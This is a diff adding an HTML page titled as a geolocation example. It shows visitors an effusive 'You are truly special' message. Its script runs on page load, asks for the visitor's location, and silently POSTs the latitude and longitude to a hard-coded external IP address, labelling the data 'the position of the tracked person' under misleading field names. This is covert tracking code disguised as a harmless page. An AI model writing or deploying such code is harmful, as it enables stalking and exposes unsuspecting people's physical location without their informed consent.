@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Geolocation Example</title>
+    <style>
+      body{
+        background: linear-gradient(to right, rgb(201, 89, 89), rgb(93, 93, 153));
+      }
+    </style>
+</head>
+<body>
+
+<p id="demo">You are truly special. In a world filled with countless individuals, your uniqueness shines brightly, illuminating the lives of those around you. Your presence brings warmth and comfort, your perspective offers insight and inspiration, and your actions leave an indelible mark on the hearts of others. Your journey, with its triumphs and challenges, is a testament to your strength and resilience. You possess qualities that are distinctly yours, making you an irreplaceable part of the tapestry of humanity. Never doubt the significance of your existence, for you bring joy, love, and meaning to the world in ways that only you can. Embrace your individuality, celebrate your gifts, and know that you are cherished for the remarkable person you are.</p>
+
+<script>
+const x = document.getElementById("demo");
+
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(showPosition, showError);
+} else {
+  x.innerHTML = "not supported by this browser.";
+}
+
+
+
+
+function showPosition(position) {
+  x.innerHTML = "Latitude: " + position.coords.latitude +
+  "<br>Longitude: " + position.coords.longitude;
+  data = {
+  sender: position.coords.latitude,
+  senderEmail: position.coords.longitude,
+  message: "the postition of the tracked person"
+}
+
+const requestOptions = {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  };
+fetch(`https://172.203.233.243/SendMessage`, requestOptions)
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    return response.json();
+  })
+  .then(data => {
+  })
+  .catch(error => {
+    console.error('Fetch error:', error);
+  });
+
+}
+
+function showError(error) {
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      x.innerHTML = "User denied the request for Geolocation."
+      break;
+    case error.POSITION_UNAVAILABLE:
+      x.innerHTML = "Location information is unavailable."
+      break;
+    case error.TIMEOUT:
+      x.innerHTML = "The request to get user location timed out."
+      break;
+    case error.UNKNOWN_ERROR:
+      x.innerHTML = "An unknown error occurred."
+      break;
+  }
+}
+</script>
+
+<!-- <button onclick="getLocation()">Get Location</button> -->
+
+</body>
+</html>
